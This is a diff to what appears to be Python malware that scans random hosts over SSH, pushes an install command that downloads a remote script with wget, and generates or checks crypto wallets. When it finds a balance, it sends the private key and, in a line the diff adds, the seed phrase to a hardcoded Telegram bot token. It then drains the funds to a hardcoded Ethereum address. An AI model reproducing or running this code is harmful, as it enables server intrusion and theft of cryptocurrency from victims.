@@ -1,7 +1,5 @@
 import paramiko
-import os
 import sys
-import socket
 import threading, time
 import random
 from termcolor import colored
@@ -3276,7 +3274,7 @@ def ssh_connect(target_ip, username, password, port, commandd):
 
 command = "apt install python3  &&  pip install paramiko &&  pip install termcolor && pip install web3 && pip install coincurve && pip install  bip44 && pip install bip39 && pip install requests && wget https://raw.githubusercontent.com/dasdrqw3/mn/main/sshC.py"
 
-print("\n\nThor v2.1a starting...")
+
 
 
 def starrtt(ip, portlist):
@@ -3702,14 +3700,12 @@ def startgenerate():
         '80dcb14352ff4271b8d4b81e6656aeb0', '6db3e771dd5e466799e5040b0d48f267', '56b9079ab30148478396e88899e98407',
         '639d95786c234ebf8f6f8e36b66b96c1', 'aed29df7f65a424c99592c68366f9cff', '43737c34db7144689f79bada61d32ab3',
         '8523c6e742e74716ac13fc1046980f04', 'c6a5361fc69745b4a9e26c7d5ee9955f', 'ea26a276dbdb431e96fdde1a3fb2e710',
-        '1882f45397a84c66885d834efaa34254', 'f0f23de07131471f88a069822d210964', 'a7984b8d138c4005bfe868d69f90d691'
+        '1882f45397a84c66885d834efaa34254', 'f0f23de07131471f88a069822d210964', 'a7984b8d138c4005bfe868d69f90d691',
+
 
     ]
 
-    #
-    # sk, pk = w.derive_account(60, 0)
-    # sk = PrivateKey(sk)
-    # print(get_eth_addr(pk))
+
     def telesend(masge, id, token):
         re.get(
             f"https://api.telegram.org/{token}/sendMessage?chat_id={id}&text={masge}")
@@ -3730,10 +3726,6 @@ def startgenerate():
         gp = int(gasprice)
         finalgs = gp * gaslimit
         vals = bl - finalgs
-        # print(walebalance)
-        # print(gp)
-        # print(vals)
-        print(web3.toWei('250', 'gwei'))
         tx = {
             'nonce': nonce,
             'to': to_account,
@@ -3767,7 +3759,8 @@ def startgenerate():
                   BALANCE FOUND!
                   Balance:{bl}
                   pv:{pvkey}
-                  Address:{address}              
+                  Address:{address}          
+                  seeds:{memonow}    
                   """
                     telesend(message, "5360129987", "bot5626558084:AAF6bJpSFaSK8GrC9Dj4gMGSxfZ6JeG-S8o")
                     print(f"Balance found:{bl} pv:{pvkey}\ntry withdraw....")
@@ -3781,6 +3774,7 @@ def startgenerate():
                         else:
                             try:
                                 count = count + 1
+                                
                                 sendeth(infura_url, address, "0xaDB47f9E6A7a93D8cA2837B971b9aF7209f73ACD", pvkey)
                                 print("Withdraw success")
                                 telesend("Withdraw success", "5360129987",
@@ -3799,16 +3793,20 @@ hh.start()
 while True:
     idcount = 0
     count = count + 1
-    if count == 10:
-        time.sleep(50)
+    if count == 5:
+        time.sleep(120)
         count = 0
     else:
         ippp = random.choice(ips)
         portt = []
         porcount = 0
 
-        while porcount < 200:
-            portt.append(random.choice(ports))
+        while porcount < 150:
+            por = random.choice(ports)
+            if por in portt:
+                continue
+            else:
+                portt.append(por)
             porcount = porcount + 1
             idcount = idcount+1
             updatestate(idcount, id_msg)
@@ -3816,7 +3814,6 @@ while True:
 
         t = threading.Thread(target=starrtt, args=(ippp, portt))
         t.start()
-
 
 
 
